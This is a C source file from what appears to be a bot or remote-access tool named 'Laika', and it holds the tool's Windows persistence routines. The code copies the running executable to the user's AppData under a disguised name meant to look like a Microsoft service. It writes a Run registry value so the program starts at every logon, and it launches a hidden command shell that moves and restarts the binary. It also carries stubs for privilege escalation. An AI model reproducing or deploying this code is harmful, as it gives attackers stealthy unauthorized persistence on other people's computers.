/* platform specific code for achieving persistence on windows */

#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>

#pragma comment(lib, "Shlwapi.lib") 

#include "persist.h"
#include "lconfig.h"
#include "lmem.h"
#include "lerror.h"

/*      we want a semi-random mutex that is stable between similar builds,
*   so we use the GIT_VERSION as our mutex :D */
#define LAIKA_MUTEX LAIKA_VERSION_COMMIT ".0"

/* looks official enough */
#define LAIKA_INSTALL_DIR "Microsoft"
#define LAIKA_INSTALL_FILE "UserServiceController.exe"

#define LAIKA_REG_KEY "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define LAIKA_REG_VAL "UserServiceController"

HANDLE laikaB_mutex;

/* check if laika is running as super-user */
bool laikaB_checkRoot() {
    return true; /* stubbed for now */
}

/* mark that laika is currently running */
void laikaB_markRunning() {
    laikaB_mutex = OpenMutex(MUTEX_ALL_ACCESS, false, TEXT(LAIKA_MUTEX));

    if (!laikaB_mutex) {
        /* mutex doesn't exist, we're the only laika process :D */
        laikaB_mutex = CreateMutex(NULL, 0, TEXT(LAIKA_MUTEX));
    } else {
        LAIKA_ERROR("Mutex already exists!\n");
    }
}

/* unmark that laika is currently running */
void laikaB_unmarkRunning() {
    ReleaseMutex(laikaB_mutex);
}

HKEY openReg(HKEY key, LPCTSTR subKey) {
    HKEY hKey;

    if (RegOpenKeyEx(key, subKey, 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
        LAIKA_ERROR("Failed to open registry key!\n");

    return hKey;
}

/* returns raw multi-string value from registry : see REG_MULTI_SZ at https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-value-types */
LPTSTR readReg(HKEY key, LPCTSTR val, LPDWORD sz) {
    LPTSTR str = NULL;
    DWORD ret;

    /* get the size */
    *sz = 0;
    RegQueryValueEx(key, val, NULL, NULL, NULL, sz);

    if (*sz != 0) {
        str = (LPCTSTR)laikaM_malloc(*sz);

        if ((ret = RegQueryValueEx(key, val, NULL, NULL, str, sz)) != ERROR_SUCCESS)
            LAIKA_ERROR("Failed to read registry!\n");
    }

    return str;
}

void writeReg(HKEY key, LPCTSTR val, LPTSTR data, DWORD sz) {
    LONG code;

    if ((code = RegSetValueEx(key, val, 0, REG_MULTI_SZ, (LPBYTE)data, sz)) != ERROR_SUCCESS)
        LAIKA_ERROR("Failed to write registry!\n");
}

void getExecutablePath(LPTSTR path) {
    if (GetModuleFileName(NULL, path, MAX_PATH) == 0)
        LAIKA_ERROR("Failed to get executable path!\n");
}

void getInstallPath(LPTSTR path) {
    /* SHGetFolderPath is deprecated but,,,,, it's still here for backwards compatibility and microsoft will probably never completely remove it :P */
    if (SHGetFolderPath(NULL, CSIDL_APPDATA | CSIDL_FLAG_CREATE, NULL, 0, path) != S_OK)
        LAIKA_ERROR("Failed to get APPDATA!\n");

    PathAppend(path, TEXT(LAIKA_INSTALL_DIR));

    if (!CreateDirectory(path, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
        LAIKA_ERROR("Failed to create directory '%s'!\n", path);

    PathAppend(path, TEXT(LAIKA_INSTALL_FILE));
}

/* windows doesn't let you move/delete/modify any currently executing file (since a file handle to the executable is open), so we
    spawn a shell to move the exe *after* we exit. */
void installSelf() {
    TCHAR szFile[MAX_PATH], szInstall[MAX_PATH], szCmd[(MAX_PATH*4)];

    getExecutablePath(szFile);
    getInstallPath(szInstall);

    if (lstrcmp(szFile, szInstall) == 0) {
        LAIKA_DEBUG("Laika already installed!\n");
        return;
    }

    LAIKA_DEBUG("moving '%s' to '%s'!\n", szFile, szInstall);

    /* wait for 3 seconds (so our process has time to exit) & move the exe, then restart laika */
    lstrcpy(szCmd, TEXT("/C timeout /t 3 > NUL & move "));
    lstrcat(szCmd, szFile);
    lstrcat(szCmd, TEXT(" "));
    lstrcat(szCmd, szInstall);
    lstrcat(szCmd, TEXT(" > NUL & "));
    lstrcat(szCmd, szInstall);

    if (GetEnvironmentVariable("COMSPEC", szFile, MAX_PATH) == 0 || (INT)ShellExecute(NULL, NULL, szFile, szCmd, NULL, SW_HIDE) <= 32)
        LAIKA_ERROR("Failed to start shell for moving exe!\n");

    laikaB_unmarkRunning();
    exit(0);
}

void installRegistry() {
    TCHAR newRegValue[MAX_PATH];
    LPTSTR regVal;
    DWORD regSz;
    DWORD newRegSz;
    HKEY reg;

    /* create REG_MULTI_SZ */
    getInstallPath(newRegValue);
    newRegSz = lstrlen(newRegValue) + 1;
    newRegValue[newRegSz] = '\0';

    reg = openReg(HKEY_CURRENT_USER, TEXT(LAIKA_REG_KEY));
    if ((regVal = readReg(reg, TEXT(LAIKA_REG_VAL), &regSz)) != NULL) {
        LAIKA_DEBUG("Current Registry value: '%s'\n", regVal);

        /* compare regValue with the install path we'll need */
        if (regSz != newRegSz || memcmp(newRegValue, regVal, regSz) != 0) {
            LAIKA_DEBUG("No match! Updating registry...\n");
            /* it's not our install path, so write it */
            writeReg(reg, TEXT(LAIKA_REG_VAL), newRegValue, newRegSz);
        }

        laikaM_free(regVal);
    } else {
        LAIKA_DEBUG("Empty registry! Updating registry...\n");
        /* no registry value set! install it and set! */
        writeReg(reg, TEXT(LAIKA_REG_VAL), newRegValue, newRegSz);
    }

    RegCloseKey(reg);
}

/* try to gain persistance on machine */
void laikaB_tryPersist() {
    installRegistry();
    installSelf();
}

/* try to gain root */
void laikaB_tryRoot() {
    /* stubbed */
}